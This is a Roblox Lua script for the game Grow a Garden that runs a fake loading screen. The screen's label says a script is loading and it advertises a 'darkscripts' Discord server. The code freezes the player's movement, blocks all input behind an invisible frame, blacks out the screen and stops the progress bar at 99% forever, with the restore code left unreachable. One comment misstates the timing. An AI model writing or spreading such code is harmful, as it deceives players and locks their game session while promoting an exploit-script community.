--// Grow a Garden Fully Covered Black Screen Stuck at 99% with Turtle Loading
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Disable movement
local originalWalkSpeed = humanoid.WalkSpeed
local originalJumpPower = humanoid.JumpPower
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0

-- Create ScreenGui
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "GrowGardenLoading"
loadingGui.Parent = playerGui
loadingGui.ResetOnSpawn = false
loadingGui.IgnoreGuiInset = true

-- Block user input entirely while loading
local inputBlocker = Instance.new("Frame")
inputBlocker.Size = UDim2.new(1,0,1,0)
inputBlocker.BackgroundTransparency = 1
inputBlocker.ZIndex = 999
inputBlocker.Parent = loadingGui

-- Full black overlay covering everything
local overlay = Instance.new("Frame")
overlay.Size = UDim2.new(1,0,1,0)
overlay.Position = UDim2.new(0,0,0,0)
overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
overlay.BackgroundTransparency = 0 -- completely opaque
overlay.ZIndex = 1
overlay.Parent = loadingGui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,50)
title.Position = UDim2.new(0,0,0.2,0)
title.BackgroundTransparency = 1
title.Text = "🌴 GROW A GARDEN 🌴"
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.fromRGB(255,255,255)
title.ZIndex = 2
title.Parent = loadingGui

-- Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1,0,0,30)
subtitle.Position = UDim2.new(0,0,0.3,0)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Script Loading Please Wait for a While"
subtitle.TextScaled = true
subtitle.Font = Enum.Font.Gotham
subtitle.TextColor3 = Color3.fromRGB(255,255,255)
subtitle.ZIndex = 2
subtitle.Parent = loadingGui

-- Progress Bar Background
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.6,0,0,20)
barBg.Position = UDim2.new(0.2,0,0.4,0)
barBg.BackgroundColor3 = Color3.fromRGB(30,30,30)
barBg.BorderSizePixel = 0
barBg.BackgroundTransparency = 0
barBg.ZIndex = 2
barBg.Parent = loadingGui
barBg.ClipsDescendants = true
barBg.AnchorPoint = Vector2.new(0,0.5)

-- Progress Bar Fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0,0,1,0)
barFill.BackgroundColor3 = Color3.fromRGB(0,200,0)
barFill.BorderSizePixel = 0
barFill.BackgroundTransparency = 0
barFill.ZIndex = 3
barFill.Parent = barBg

-- Discord Link Label inside bar
local discordLabel = Instance.new("TextLabel")
discordLabel.Size = UDim2.new(1,0,1,0)
discordLabel.BackgroundTransparency = 1
discordLabel.Text = "discord.gg/darkscripts"
discordLabel.TextColor3 = Color3.fromRGB(255,255,255)
discordLabel.Font = Enum.Font.Gotham
discordLabel.TextScaled = true
discordLabel.ZIndex = 3
discordLabel.Parent = barBg

-- Percentage Text
local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(1,0,0,30)
percent.Position = UDim2.new(0,0,0.5,50)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextScaled = true
percent.Font = Enum.Font.GothamBold
percent.TextColor3 = Color3.fromRGB(255,255,255)
percent.ZIndex = 2
percent.Parent = loadingGui

-- Animate Loading (super duper slow turtle and stuck at 99%)
local progress = 0
while true do
    if progress < 99 then
        progress = progress + 1
        if progress > 99 then progress = 99 end
    end
    
    barFill.Size = UDim2.new(progress/100,0,1,0)
    percent.Text = progress .. "%"
    
    wait(5) -- super duper slow turtle loading (2 seconds per 1%)
end

-- The script never reaches here because loading is stuck forever

-- Restore movement if ever needed (unreachable in this version)
-- humanoid.WalkSpeed = originalWalkSpeed
-- humanoid.JumpPower = originalJumpPower

-- loadingGui:Destroy()
